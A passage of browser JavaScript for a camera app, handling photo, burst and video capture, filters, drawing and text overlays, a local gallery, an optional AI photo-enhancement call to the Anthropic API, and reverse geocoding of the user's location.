    ctx.restore();
  });
}

// ════════════════════════════════════════════════════
//  TEXT TOOL
// ════════════════════════════════════════════════════
function initText(){
  document.querySelectorAll('.ti-style-btn').forEach(b=>{
    b.addEventListener('click',()=>{ document.querySelectorAll('.ti-style-btn').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.textBg=b.dataset.bg; });
  });
  $('tiAddBtn').addEventListener('click',commitText);
  $('tiCancelBtn').addEventListener('click',closeTextInput);
  $('tiField').addEventListener('keydown',e=>{
    if(e.key==='Enter') commitText();
    if(e.key==='Escape') closeTextInput();
  });
}

function openTextInput(){ $('textInput').classList.add('on'); $('tiField').value=''; setTimeout(()=>$('tiField').focus(),100); }
function closeTextInput(){ $('textInput').classList.remove('on'); }

function commitText(){
  const txt=$('tiField').value.trim(); if(!txt) return closeTextInput();
  addTextToLayer($('textLayer'),txt,S.textBg,S.textColor,'50%','45%');
  closeTextInput(); showToast('Text added');
}

function addTextToLayer(layer,txt,bg,color,x,y){
  const el=document.createElement('div');
  el.className='txt-item '+bg; el.textContent=txt; el.style.color=color;
  el.style.left=x; el.style.top=y; layer.appendChild(el); makeDraggable(el);
}

function makeDraggable(el){
  let mx=0,my=0,dragging=false;
  function onDown(e){ const p=e.touches?e.touches[0]:e; mx=p.clientX; my=p.clientY; dragging=true; document.addEventListener('mousemove',onMove); document.addEventListener('mouseup',onUp); document.addEventListener('touchmove',onMove,{passive:false}); document.addEventListener('touchend',onUp); e.preventDefault(); }
  function onMove(e){ if(!dragging) return; const p=e.touches?e.touches[0]:e; const dx=p.clientX-mx, dy=p.clientY-my; mx=p.clientX; my=p.clientY; el.style.left=(el.offsetLeft+dx)+'px'; el.style.top=(el.offsetTop+dy)+'px'; el.style.transform='none'; e.preventDefault?.(); }
  function onUp(){ dragging=false; document.removeEventListener('mousemove',onMove); document.removeEventListener('mouseup',onUp); document.removeEventListener('touchmove',onMove); document.removeEventListener('touchend',onUp); }
  el.addEventListener('mousedown',onDown); el.addEventListener('touchstart',onDown,{passive:false});
}

// ════════════════════════════════════════════════════
//  SLIDERS
// ════════════════════════════════════════════════════
function initSliders(){
  [['slB','vB','b'],['slC','vC','c'],['slS','vS','s'],['slH','vH','h'],['slV','vV','v'],['slW','vW','w'],['slF','vF','f'],['slSh','vSh','sh']].forEach(([sid,vid,key])=>{
    const sl=$(sid); if(!sl) return;
    sl.addEventListener('input',()=>{ S.adj[key]=parseFloat(sl.value); $(vid).textContent=sl.value; });
  });
  $('adjReset').addEventListener('click',()=>{
    S.adj={b:100,c:100,s:100,h:0,v:0,w:0,f:0,sh:0};
    [['slB',100],['slC',100],['slS',100],['slH',0],['slV',0],['slW',0],['slF',0],['slSh',0]].forEach(([id,v])=>$(id).value=v);
    [['vB',100],['vC',100],['vS',100],['vH',0],['vV',0],['vW',0],['vF',0],['vSh',0]].forEach(([id,v])=>$(id).textContent=v);
    showToast('Adjustments reset');
  });
}

// ════════════════════════════════════════════════════
//  CONTROLS (rest of your existing controls remain unchanged)
// ════════════════════════════════════════════════════
function initControls(){
  document.querySelectorAll('.mode-pill').forEach(btn=>{
    btn.addEventListener('click',()=>{
      document.querySelectorAll('.mode-pill').forEach(b=>b.classList.remove('on'));
      btn.classList.add('on'); S.mode=btn.dataset.m;
      $('shutter').classList.toggle('vid-mode',S.mode==='video');
      positionModeIndicator();
      showToast(S.mode.toUpperCase()+' MODE');
    });
  });
  $('flipBtn').addEventListener('click',async ()=>{
    const newFacing = S.facing==='environment' ? 'user' : 'environment';
    await startCamera(newFacing);
    showToast(newFacing==='user'?'Front camera':'Rear camera');
  });
  $('galThumb').addEventListener('click',openGallery);
  const zooms=[1,2,4,8];
  $('zoomCycleBtn').addEventListener('click',()=>{
    const idx=zooms.findIndex(z=>Math.abs(z-S.zoom)<.5);
    S.zoom=zooms[(idx+1)%zooms.length];
    $('zoomCycleBtn').textContent=S.zoom+'×';
    showZoom(S.zoom+'×');
  });
  let p0=0,pz0=1;
  $('vf').addEventListener('touchstart',e=>{ if(e.touches.length===2){ p0=hyp(e.touches); pz0=S.zoom; e.preventDefault(); } },{passive:false});
  $('vf').addEventListener('touchmove',e=>{ if(e.touches.length===2){ S.zoom=Math.max(1,Math.min(8,pz0*(hyp(e.touches)/p0))); const z=S.zoom.toFixed(1); $('zoomCycleBtn').textContent=z+'×'; showZoom(z+'×'); e.preventDefault(); } },{passive:false});
  $('vf').addEventListener('click',e=>{
    if(e.target.closest('#topNav,#drawToolbar,#filterStrip,#drawCanvas,#textLayer,#stickerLayer,#histoWidget')) return;
    const fb=$('focusBox'); fb.style.left=e.clientX+'px'; fb.style.top=e.clientY+'px';
    fb.classList.remove('show'); void fb.offsetWidth; fb.classList.add('show');
    setTimeout(()=>fb.classList.remove('show'),1000);
  });
  const flashModes=['off','on','auto'];
  const flashIcons={off:'⚡',on:'🔦',auto:'🌟'};
  $('flashBtn').addEventListener('click',()=>{
    const idx=flashModes.indexOf(S.flashMode);
    S.flashMode=flashModes[(idx+1)%3];
    $('flashBtn').textContent=flashIcons[S.flashMode];
    $('flashBtn').classList.toggle('active-gold',S.flashMode!=='off');
    showToast('Flash: '+S.flashMode.toUpperCase());
  });
  $('adjToggleBtn').addEventListener('click',()=>toggleDrawer('adjDrawer'));
  $('settingsBtn').addEventListener('click',()=>toggleDrawer('settingsDrawer'));
  initSettings();
  $('tbFilters').addEventListener('click',()=>{ const on=!$('filterStrip').classList.contains('on'); $('filterStrip').classList.toggle('on',on); $('tbFilters').classList.toggle('on',on); });
  $('tbText').addEventListener('click',openTextInput);
  $('tbStickers').addEventListener('click',()=>toggleDrawer('stickerDrawer'));
  $('tbGrid').addEventListener('click',()=>{ S.showGrid=!S.showGrid; $('grid').classList.toggle('on',S.showGrid); $('tbGrid').classList.toggle('on',S.showGrid); });
  $('tbHorizon').addEventListener('click',()=>{ S.showHorizon=!S.showHorizon; $('horizon').classList.toggle('on',S.showHorizon); $('tbHorizon').classList.toggle('on',S.showHorizon); showToast(S.showHorizon?'Level ON':'Level OFF'); });
  $('histoBtn').addEventListener('click',()=>{ S.showHisto=!S.showHisto; $('histoWidget').classList.toggle('on',S.showHisto); $('histoBtn').classList.toggle('active-gold',S.showHisto); showToast(S.showHisto?'Histogram ON':'Histogram OFF'); });
  $('clearEditsBtn').addEventListener('click', clearAllEdits);
  document.querySelectorAll('.tdot').forEach(d=>{
    d.addEventListener('click',()=>{
      document.querySelectorAll('.tdot').forEach(x=>x.classList.remove('on'));
      d.classList.add('on'); S.timerDelay=parseInt(d.dataset.t);
      showToast(S.timerDelay>0?`Timer: ${S.timerDelay}s`:'Timer OFF');
    });
  });
  $('backdrop').addEventListener('click',closeAllDrawers);
}

function clearAllEdits() {
  S.drawHistory = [];
  $('textLayer').innerHTML = '';
  $('stickerLayer').innerHTML = '';
  const dc=$('drawCanvas');
  dc.getContext('2d').clearRect(0,0,dc.width,dc.height);
  showToast('All edits cleared');
}

function initSettings(){
  [['swLoc','showLoc'],['swTime','showTime'],['swSound','showSound'],['swSave','showSave']].forEach(([id,key])=>{
    const sw=$(id); if(!sw) return;
    sw.addEventListener('click',()=>{ S[key]=!S[key]; sw.classList.toggle('on',S[key]); });
  });
  $('swHisto').addEventListener('click',()=>{
    S.showHisto=!S.showHisto; $('swHisto').classList.toggle('on',S.showHisto);
    $('histoWidget').classList.toggle('on',S.showHisto);
    $('histoBtn').classList.toggle('active-gold',S.showHisto);
  });
}

function positionModeIndicator(){
  const active=document.querySelector('.mode-pill.on'); if(!active) return;
  const strip=$('modeStrip'); const sr=strip.getBoundingClientRect(), ar=active.getBoundingClientRect();
  $('modeInd').style.left=(ar.left-sr.left+ar.width/2-9)+'px';
}

function toggleDrawer(id){
  const el=$(id), opening=!el.classList.contains('on');
  closeAllDrawers();
  if(opening){ el.classList.add('on'); $('backdrop').classList.add('on'); }
}
function closeDrawer(id){ $(id).classList.remove('on'); if(!document.querySelector('.drawer.on')) $('backdrop').classList.remove('on'); }
function closeAllDrawers(){ document.querySelectorAll('.drawer').forEach(d=>d.classList.remove('on')); $('backdrop').classList.remove('on'); }

// ════════════════════════════════════════════════════
//  CAPTURE (rest remains unchanged)
// ════════════════════════════════════════════════════
function initCapture(){
  $('shutter').addEventListener('click',()=>{
    if(S.mode==='photo'||S.mode==='portrait') doPhoto();
    else if(S.mode==='burst') doBurst();
    else toggleVideo();
  });
}

async function doPhoto(){
  if(S.timerDelay>0) await runTimer(S.timerDelay);
  if(S.showSound) playShutterSound();
  flashEffect();
  captureFrame();
}

function flashEffect(){
  const fe=$('flashEl');
  fe.classList.add('go');
  setTimeout(()=>fe.classList.remove('go'),100);
}

function captureFrame(){
  const vid=$('vid');
  const c=document.createElement('canvas');
  c.width=vid.videoWidth||1280; c.height=vid.videoHeight||720;
  const ctx=c.getContext('2d');
  ctx.filter=getCSS();
  const sc=S.zoom, dx=(c.width*(1-sc))/2, dy=(c.height*(1-sc))/2;
  ctx.setTransform(sc,0,0,sc,dx,dy);
  ctx.drawImage(vid,0,0);
  ctx.setTransform(1,0,0,1,0,0);
  ctx.filter='none';
  if(S.adj.v>0){
    const al=S.adj.v/100*.85;
    const g=ctx.createRadialGradient(c.width/2,c.height/2,c.width*.25,c.width/2,c.height/2,c.width*.8);
    g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
    ctx.fillStyle=g; ctx.fillRect(0,0,c.width,c.height);
  }
  S.drawHistory.forEach(line=>{
    if(!line.pts?.length) return;
    ctx.save();
    if(line.color==='__erase__'){
      ctx.globalCompositeOperation='destination-out';
      ctx.strokeStyle='rgba(0,0,0,1)';
    } else {
      ctx.globalCompositeOperation='source-over';
      ctx.strokeStyle=line.color;
      ctx.globalAlpha=line.opacity??1;
    }
    ctx.lineWidth=line.size*(c.width/window.innerWidth);
    applyTip(ctx, line.tip||'round');
    ctx.beginPath();
    ctx.moveTo(line.pts[0][0]/window.innerWidth*c.width, line.pts[0][1]/$('vf').clientHeight*c.height);
    line.pts.slice(1).forEach(p=>ctx.lineTo(p[0]/window.innerWidth*c.width,p[1]/$('vf').clientHeight*c.height));
    ctx.stroke();
    ctx.restore();
  });
  const url=c.toDataURL('image/jpeg',.93);
  S.capturedUrl=url; S.capturedType='photo'; S._origUrl=url;
  if(S.showSave){ saveToGallery({type:'photo',dataUrl:url,loc:S.loc?.city||'',time:Date.now()}); }
  showPreview(url,'photo');
}

async function doBurst(){
  const N=5;
  $('burstViz').classList.add('on');
  const dots=$('burstDots'); dots.innerHTML='';
  for(let i=0;i<N;i++){ const d=document.createElement('div'); d.className='bv-dot'; dots.appendChild(d); }
  const dotEls=dots.querySelectorAll('.bv-dot');
  if(S.showSound) playShutterSound();
  for(let i=0;i<N;i++){
    $('burstNum').textContent=i+1;
    dotEls[i]?.classList.add('lit');
    flashEffect();
    const vid=$('vid');
    const c=document.createElement('canvas'); c.width=vid.videoWidth||1280; c.height=vid.videoHeight||720;
    const ctx=c.getContext('2d'); ctx.filter=getCSS(); ctx.drawImage(vid,0,0); ctx.filter='none';
    const url=c.toDataURL('image/jpeg',.9);
    if(S.showSave) saveToGallery({type:'photo',dataUrl:url,loc:S.loc?.city||'',time:Date.now()});
    if(i===N-1){ S.capturedUrl=url; S.capturedType='photo'; S._origUrl=url; }
    await sleep(180);
  }
  await sleep(300);
  $('burstViz').classList.remove('on');
  showToast(`${N} burst shots saved`);
}

async function toggleVideo(){
  if(!S.recording){
    try{
      const opts={mimeType:'video/webm;codecs=vp9'};
      let mr; try{ mr=new MediaRecorder(S.stream,opts); }catch{ mr=new MediaRecorder(S.stream); }
      S.mr=mr; S.chunks=[]; S.recording=true; S.recSec=0;
      mr.ondataavailable=e=>{ if(e.data.size) S.chunks.push(e.data); };
      mr.onstop=()=>{
        const blob=new Blob(S.chunks,{type:'video/webm'});
        const url=URL.createObjectURL(blob);
        S.capturedUrl=url; S.capturedType='video';
        if(S.showSave) saveToGallery({type:'video',blobUrl:url,loc:S.loc?.city||'',time:Date.now()});
        showPreview(url,'video');
      };
      mr.start(200);
      $('shutter').classList.add('recording'); $('recBadge').classList.add('on');
      S.recTick=setInterval(()=>{ S.recSec++; const m=String(Math.floor(S.recSec/60)).padStart(2,'0'),s=String(S.recSec%60).padStart(2,'0'); $('recTimer').textContent=m+':'+s; },1000);
    }catch(e){ showToast('Recording failed: '+e.message); S.recording=false; }
  } else {
    S.recording=false; clearInterval(S.recTick);
    $('shutter').classList.remove('recording'); $('recBadge').classList.remove('on');
    S.mr?.stop();
  }
}

async function runTimer(secs){
  const el=$('timerNum'); el.classList.add('on');
  for(let i=secs;i>0;i--){ el.textContent=i; await sleep(1000); }
  el.classList.remove('on');
}

function playShutterSound(){
  try{
    const ac=new AudioContext();
    const osc=ac.createOscillator(); const g=ac.createGain();
    osc.connect(g); g.connect(ac.destination);
    osc.frequency.setValueAtTime(1200,ac.currentTime);
    osc.frequency.exponentialRampToValueAtTime(400,ac.currentTime+.08);
    g.gain.setValueAtTime(.35,ac.currentTime);
    g.gain.exponentialRampToValueAtTime(.001,ac.currentTime+.1);
    osc.start(); osc.stop(ac.currentTime+.1);
  }catch{}
}

// ════════════════════════════════════════════════════
//  PREVIEW
// ════════════════════════════════════════════════════
function showPreview(url,type){
  S.pvRotation=0; S.pvFlipped=false;
  const img=$('pvImg'), vid=$('pvVid');
  img.style.transform='';
  img.style.display='none'; img.src='';
  vid.style.display='none'; vid.className=''; vid.src='';
  if(type==='photo'){
    img.src=url;
    img.style.display='block';
  } else {
    vid.src=url; vid.load();
    vid.style.display='block'; vid.className='on';
  }
  $('aiChip').classList.remove('on');
  $('baWrap').classList.remove('on');
  $('pvCaptionLayer').innerHTML='';
  $('textLayer').querySelectorAll('.txt-item').forEach(el=>{
    const cl=el.cloneNode(true); $('pvCaptionLayer').appendChild(cl); makeDraggable(cl);
  });
  $('stickerLayer').querySelectorAll('div').forEach(el=>{
    if(el.textContent&&el.textContent.trim()){
      const clone=el.cloneNode(true);
      clone.style.pointerEvents='all';
      $('pvCaptionLayer').appendChild(clone); makeDraggable(clone);
    }
  });
  $('preview').classList.add('on');
}

// ════════════════════════════════════════════════════
//  GALLERY
// ════════════════════════════════════════════════════
function saveToGallery(item) {
  S.gallery.unshift(item);
  if (S.gallery.length > 80) S.gallery.pop();
  const persistable = S.gallery.map(it => {
    if (it.type === 'photo') return { ...it };
    if (it.type === 'video') return { type: 'video', loc: it.loc || '', time: it.time };
    return null;
  }).filter(Boolean);
  try {
    localStorage.setItem('photon4_gal', JSON.stringify(persistable.slice(0, 30)));
  } catch (e) {}
  updateGalThumb();
}

function loadGallery(){
  try{ 
    const r=localStorage.getItem('photon4_gal'); 
    if(r) S.gallery=JSON.parse(r); 
  }catch{}
  S.gallery.forEach(item => {
    if (item.type === 'video') item.blobUrl = null;
  });
  updateGalThumb();
}

function updateGalThumb(){
  const th=$('galThumb'); if(!th) return;
  const latest=S.gallery.find(g=>g.type==='photo');
  if(latest){ th.innerHTML=`<img src="${latest.dataUrl}" alt="">`; }
  const cnt=S.gallery.length;
  $('galCnt').textContent=cnt?`${cnt}`:'';
}

function openGallery(){ renderGallery(); $('gallery').classList.add('on'); }

function renderGallery(){
  const content=$('galContent'); content.innerHTML='';
  const total=S.gallery.length;
  $('galCntLabel').textContent=total?`${total} SHOTS`:'';
  if(!total){
    content.innerHTML='<div class="gal-empty"><div class="gal-empty-ico">📷</div><div class="gal-empty-h">EMPTY</div><div class="gal-empty-p">No captures yet</div></div>';
    return;
  }
  if(S.galView==='grid'){
    const wrap=document.createElement('div'); wrap.className='gal-grid-wrap';
    S.gallery.forEach(item=>{ const gi=makeGI(item); wrap.appendChild(gi); });
    content.appendChild(wrap);
  } else {
    const groups={};
    S.gallery.forEach(item=>{ const d=item.time?new Date(item.time).toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric'}):'Today'; if(!groups[d]) groups[d]=[]; groups[d].push(item); });
    Object.entries(groups).forEach(([date,items])=>{
      const hdr=document.createElement('div'); hdr.className='gal-date-hdr'; hdr.textContent=date; content.appendChild(hdr);
      items.forEach(item=>{
        const gi=document.createElement('div'); gi.className='gl-item';
        const th=document.createElement('div'); th.className='gl-thumb';
        if(item.dataUrl){ const img=document.createElement('img'); img.src=item.dataUrl; th.appendChild(img); }
        const info=document.createElement('div'); info.className='gl-info';
        info.innerHTML=`<div class="gl-loc">${item.loc||'Unknown location'}</div><div class="gl-meta">${item.time?new Date(item.time).toLocaleTimeString():''} · ${(item.type||'photo').toUpperCase()}</div>`;
        gi.appendChild(th); gi.appendChild(info);
        gi.addEventListener('click',()=>openFromGallery(item));
        content.appendChild(gi);
      });
    });
  }
}

function makeGI(item){
  const div=document.createElement('div'); div.className='gi';
  const ov=document.createElement('div'); ov.className='gi-overlay'; div.appendChild(ov);
  if(item.type==='video'){
    const v=document.createElement('video'); v.src=item.blobUrl; v.muted=true; div.appendChild(v);
    const b=document.createElement('div'); b.className='gi-badge'; b.textContent='VID'; div.appendChild(b);
  } else {
    const img=document.createElement('img'); img.src=item.dataUrl; img.loading='lazy'; div.appendChild(img);
    if(item.loc){ const l=document.createElement('div'); l.className='gi-loc'; l.textContent=item.loc; div.appendChild(l); }
  }
  div.addEventListener('click',()=>openFromGallery(item)); return div;
}

function openFromGallery(item){ S.capturedUrl=item.dataUrl||item.blobUrl; S.capturedType=item.type||'photo'; S._origUrl=S.capturedUrl; $('gallery').classList.remove('on'); showPreview(S.capturedUrl,S.capturedType); }

function initGallery(){
  $('pvBackBtn').addEventListener('click',()=>{
    $('preview').style.transform=''; $('preview').style.opacity='';
    $('preview').classList.remove('on');
  });
  $('pvEdit').addEventListener('click',()=>{
    $('preview').style.transform=''; $('preview').style.opacity='';
    $('preview').classList.remove('on');
  });
  $('pvDiscard').addEventListener('click',()=>{
    $('preview').style.transition=''; $('preview').style.transform=''; $('preview').style.opacity='';
    discardPreview();
  });
  $('pvDownload').addEventListener('click',dlMedia);
  $('pvShare').addEventListener('click',shareMedia);
  $('pvQuickSave').addEventListener('click',dlMedia);
  $('galBack').addEventListener('click',()=>$('gallery').classList.remove('on'));
  $('gvGrid').addEventListener('click',()=>{ S.galView='grid'; $('gvGrid').classList.add('on'); $('gvList').classList.remove('on'); renderGallery(); });
  $('gvList').addEventListener('click',()=>{ S.galView='list'; $('gvList').classList.add('on'); $('gvGrid').classList.remove('on'); renderGallery(); });
  $('pvtAI').addEventListener('click',runAI);
  $('pvtBA').addEventListener('click',()=>{ if(S.capturedType==='video') return showToast('Photos only'); $('baWrap').classList.toggle('on'); });
  $('pvtCaption').addEventListener('click',()=>{ openTextInput(); });
  $('pvtRotate').addEventListener('click',()=>{ S.pvRotation=(S.pvRotation+90)%360; updatePvTransform(); showToast('Rotated 90°'); });
  $('pvtFlip').addEventListener('click',()=>{ S.pvFlipped=!S.pvFlipped; updatePvTransform(); showToast(S.pvFlipped?'Flipped':'Unflipped'); });
  $('pvtStickers').addEventListener('click',()=>toggleDrawer('stickerDrawer'));
  document.querySelectorAll('.fmt-opt').forEach(b=>{ b.addEventListener('click',()=>{ document.querySelectorAll('.fmt-opt').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.fmt=b.dataset.f; }); });
  S.quality=0.85;
  document.querySelectorAll('.q-opt').forEach(b=>{
    b.addEventListener('click',()=>{
      document.querySelectorAll('.q-opt').forEach(x=>x.classList.remove('on'));
      b.classList.add('on');
      S.quality=parseFloat(b.dataset.q);
      $('qualSel').value=b.dataset.q;
      showToast('Quality: '+b.textContent);
    });
  });
  initSwipeDiscard();
}

function updatePvTransform(){
  $('pvImg').style.transform=`rotate(${S.pvRotation}deg) scaleX(${S.pvFlipped?-1:1})`;
}

async function dlMedia(){
  const q = S.quality ?? parseFloat($('qualSel').value);
  if(S.capturedType==='video'){
    const a=document.createElement('a'); a.href=S.capturedUrl; a.download=`photon-${Date.now()}.webm`; a.click();
  } else {
    const img=new Image(); img.onload=()=>{
      const c=document.createElement('canvas'); c.width=img.width; c.height=img.height;
      const ctx=c.getContext('2d');
      if(S.pvRotation||S.pvFlipped){
        ctx.save(); ctx.translate(c.width/2,c.height/2);
        ctx.rotate(S.pvRotation*Math.PI/180);
        ctx.scale(S.pvFlipped?-1:1,1);
        ctx.drawImage(img,-img.width/2,-img.height/2); ctx.restore();
      } else { ctx.drawImage(img,0,0); }
      const fmt=S.fmt==='jpg'?'image/jpeg':S.fmt==='png'?'image/png':'image/webp';
      const a=document.createElement('a'); a.href=c.toDataURL(fmt,q); a.download=`photon-${Date.now()}.${S.fmt}`; a.click();
    }; img.src=S.capturedUrl;
  }
  showToast('⬇ Saved!');
}

async function shareMedia(){
  if(navigator.share){
    try{ const r=await fetch(S.capturedUrl); const b=await r.blob(); await navigator.share({files:[new File([b],`photon-${Date.now()}.jpg`,{type:b.type})],title:'PHOTON'}); }catch{ showToast('Share cancelled'); }
  } else { showToast('Saving instead…'); dlMedia(); }
}

function discardPreview(){
  $('preview').classList.remove('on');
  S.capturedUrl=null; S.capturedType='photo'; S._origUrl=null;
  $('pvImg').src='';
  $('pvVid').src='';
  $('pvCaptionLayer').innerHTML='';
  showToast('Discarded');
}

// ════════════════════════════════════════════════════
//  SNAPCHAT-STYLE SWIPE-TO-DISCARD
// ════════════════════════════════════════════════════
function initSwipeDiscard(){
  const media=$('pvMedia');
  let startY=0, startX=0, dragging=false, curY=0;
  const THRESHOLD=110;
  function onStart(e){
    if(e.target.closest('#pvCaptionLayer,#baWrap,#aiChip,#pvSwipeHint,#pvDeleteZone')) return;
    const p=e.touches?e.touches[0]:e;
    startY=p.clientY; startX=p.clientX; dragging=true; curY=0;
  }
  function onMove(e){
    if(!dragging) return;
    const p=e.touches?e.touches[0]:e;
    const dy=p.clientY-startY;
    const dx=Math.abs(p.clientX-startX);
    if(dy<0||dx>dy) return;
    curY=dy;
    $('preview').style.transform=`translateY(${curY}px)`;
    $('preview').style.opacity=Math.max(0.3, 1-curY/240);
    $('pvDeleteZone').classList.toggle('show', curY>THRESHOLD*0.6);
    e.preventDefault();
  }
  function onEnd(){
    if(!dragging) return;
    dragging=false;
    $('pvDeleteZone').classList.remove('show');
    if(curY>=THRESHOLD){
      $('preview').style.transition='transform .22s ease,opacity .22s ease';
      $('preview').style.transform='translateY(100vh)';
      $('preview').style.opacity='0';
      setTimeout(()=>{
        $('preview').style.transition='';
        $('preview').style.transform='';
        $('preview').style.opacity='';
        discardPreview();
      },230);
    } else {
      $('preview').style.transition='transform .25s cubic-bezier(.4,0,.2,1),opacity .25s';
      $('preview').style.transform='';
      $('preview').style.opacity='';
      setTimeout(()=>{ $('preview').style.transition=''; },260);
    }
    curY=0;
  }
  media.addEventListener('touchstart',onStart,{passive:true});
  media.addEventListener('touchmove',onMove,{passive:false});
  media.addEventListener('touchend',onEnd);
  media.addEventListener('mousedown',onStart);
  window.addEventListener('mousemove',onMove);
  window.addEventListener('mouseup',onEnd);
}

// ════════════════════════════════════════════════════
//  BEFORE / AFTER
// ════════════════════════════════════════════════════
function initBeforeAfter(){
  let drag=false;
  const wrap=$('baWrap'), split=$('baSplit'), handle=$('baHandle'), imgA=$('baImgA');
  function setPos(x){ const r=wrap.getBoundingClientRect(); const pct=Math.max(5,Math.min(95,(x-r.left)/r.width*100)); split.style.left=pct+'%'; imgA.style.clipPath=`inset(0 ${100-pct}% 0 0)`; }
  split.addEventListener('mousedown',e=>{drag=true;e.preventDefault();});
  handle.addEventListener('mousedown',e=>{drag=true;e.preventDefault();});
  split.addEventListener('touchstart',e=>{drag=true;e.preventDefault();},{passive:false});
  handle.addEventListener('touchstart',e=>{drag=true;e.preventDefault();},{passive:false});
  window.addEventListener('mousemove',e=>{if(drag)setPos(e.clientX);});
  window.addEventListener('touchmove',e=>{if(drag&&e.touches[0])setPos(e.touches[0].clientX);},{passive:false});
  window.addEventListener('mouseup',()=>drag=false);
  window.addEventListener('touchend',()=>drag=false);
  const obs=new MutationObserver(()=>{ if($('baWrap').classList.contains('on')){ $('baImgA').src=S._origUrl||S.capturedUrl; split.style.left='50%'; imgA.style.clipPath='inset(0 50% 0 0)'; } });
  obs.observe($('baWrap'),{attributes:true,attributeFilter:['class']});
}

// ════════════════════════════════════════════════════
//  AI ENHANCE (unchanged)
// ════════════════════════════════════════════════════
async function runAI(){
  if(S.capturedType==='video') return showToast('AI works on photos only');
  const API_KEY = ''; // ← PASTE YOUR ANTHROPIC API KEY HERE
  if(!API_KEY){ showToast('Add your API key to enable AI'); return; }
  $('aiModal').classList.add('on');
  $('aiLoadingState').style.display='block';
  $('aiResultBox').classList.remove('on');
  $('aiProgFill').style.animation='none'; void $('aiProgFill').offsetWidth; $('aiProgFill').style.animation='';
  const statuses=['Analysing composition…','Detecting scene type…','Evaluating exposure…','Computing enhancements…','Preparing results…'];
  let si=0; const tick=setInterval(()=>{ $('aiStatusTxt').textContent=statuses[si=(si+1)%statuses.length]; },750);
  try{
    const img=new Image(); img.src=S.capturedUrl;
    await new Promise(r=>img.onload=r);
    const c=document.createElement('canvas'); c.width=320; c.height=Math.round(320*img.height/img.width);
    c.getContext('2d').drawImage(img,0,0,c.width,c.height);
    const b64 = c.toDataURL('image/jpeg', .75).split(',')[1];
    const resp = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': API_KEY,
        'anthropic-version': '2023-06-01'
      },
      body: JSON.stringify({
        model: 'claude-sonnet-4-20250514',
        max_tokens: 1000,
        messages: [{
          role: 'user',
          content: [
            { type: 'image', source: { type: 'base64', media_type: 'image/jpeg', data: b64 } },
            { type: 'text', text: `You are a professional photo editing AI. Analyse this photo and respond ONLY with valid JSON (no markdown, no extra text):
{"scene":"brief scene description (max 6 words)","mood":"single word mood","issues":["issue1","issue2"],"suggestions":{"brightness":<0-200>,"contrast":<0-200>,"saturation":<0-300>,"hue":<0-360>,"vignette":<0-100>,"warmth":<-50 to 50>,"fade":<0-100>,"filter":"one of: none|vivid|vintage|bw|warm|cool|neon|hdr|fade|film|cyber|golden|mist|punch|dusk|arctic|rose|teal"},"reasoning":"2 concise sentences explaining your choices"}` }
          ]
        }]
      })
    });
    clearInterval(tick);
    const data=await resp.json();
    const txt=data.content?.find(b=>b.type==='text')?.text||'{}';
    let parsed; try{parsed=JSON.parse(txt.replace(/```json|```/g,'').trim());}catch{parsed=null;}
    if(parsed){ S.aiData=parsed; showAIResult(parsed); }
    else{ showToast('AI analysis failed'); $('aiModal').classList.remove('on'); }
  }catch(e){
    clearInterval(tick);
    $('aiStatusTxt').textContent='Could not connect to AI';
    showToast('AI unavailable');
    setTimeout(()=>$('aiModal').classList.remove('on'),2000);
  }
}

function showAIResult(d){
  $('aiLoadingState').style.display='none';
  $('aiSceneChip').textContent='📷 '+d.scene;
  const sg=$('aiSettingsGrid'); sg.innerHTML='';
  const s=d.suggestions||{};
  const fields=[['Filter',s.filter||'none'],['Brightness',s.brightness??100],['Contrast',s.contrast??100],['Saturation',s.saturation??100],['Vignette',s.vignette??0],['Warmth',s.warmth??0]];
  fields.forEach(([k,v])=>{ const el=document.createElement('div'); el.className='ai-setting'; el.innerHTML=`<div class="ai-s-key">${k}</div><div class="ai-s-val">${v}</div>`; sg.appendChild(el); });
  $('aiReasoningTxt').textContent=d.reasoning||'';
  $('aiResultBox').classList.add('on');
}

$('aiCancel').addEventListener('click',()=>$('aiModal').classList.remove('on'));
$('aiApply').addEventListener('click',()=>{
  if(!S.aiData?.suggestions) return;
  const s=S.aiData.suggestions;
  const map=[['brightness','b','slB','vB'],['contrast','c','slC','vC'],['saturation','s','slS','vS'],['hue','h','slH','vH'],['vignette','v','slV','vV'],['warmth','w','slW','vW'],['fade','f','slF','vF']];
  map.forEach(([sk,ak,sid,vid])=>{ if(s[sk]!=null){ S.adj[ak]=s[sk]; $(sid).value=s[sk]; $(vid).textContent=s[sk]; } });
  if(s.filter){ S.filter=s.filter; document.querySelectorAll('.fc-chip').forEach(c=>c.classList.toggle('on',c.dataset.id===s.filter)); }
  if(S.capturedUrl&&S.capturedType==='photo'){
    const img=new Image(); img.onload=()=>{
      const c=document.createElement('canvas'); c.width=img.width; c.height=img.height;
      const ctx=c.getContext('2d'); ctx.filter=getCSS(); ctx.drawImage(img,0,0); ctx.filter='none';
      if(S.adj.v>0){const al=S.adj.v/100*.85;const g=ctx.createRadialGradient(c.width/2,c.height/2,c.width*.25,c.width/2,c.height/2,c.width*.8);g.addColorStop(0,'transparent');g.addColorStop(1,`rgba(0,0,0,${al})`);ctx.fillStyle=g;ctx.fillRect(0,0,c.width,c.height);}
      S.capturedUrl=c.toDataURL('image/jpeg',.93); $('pvImg').src=S.capturedUrl;
    }; img.src=S._origUrl||S.capturedUrl;
  }
  $('aiModal').classList.remove('on');
  $('aiChip').classList.add('on');
  showToast('✦ AI settings applied!');
});

// ════════════════════════════════════════════════════
//  LOCATION
// ════════════════════════════════════════════════════
function handlePosition(pos){
  const{latitude:lat,longitude:lng}=pos.coords;
  S.loc={lat,lng,city:'Locating…'};
  $('locCoords').textContent=`${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
    .then(r=>r.json())
    .then(d=>{
      const city=d.address?.city||d.address?.town||d.address?.village||d.address?.county||'Unknown';
      const cc=(d.address?.country_code||'').toUpperCase();
      S.loc.city=`${city}, ${cc}`;
      $('locCity').textContent=S.loc.city;
    })
    .catch(()=>{ S.loc.city=`${lat.toFixed(3)}°N`; $('locCity').textContent=S.loc.city; });
}

// ════════════════════════════════════════════════════
//  CLOCK
// ════════════════════════════════════════════════════
function startClock(){
  function tick(){
    const n=new Date();
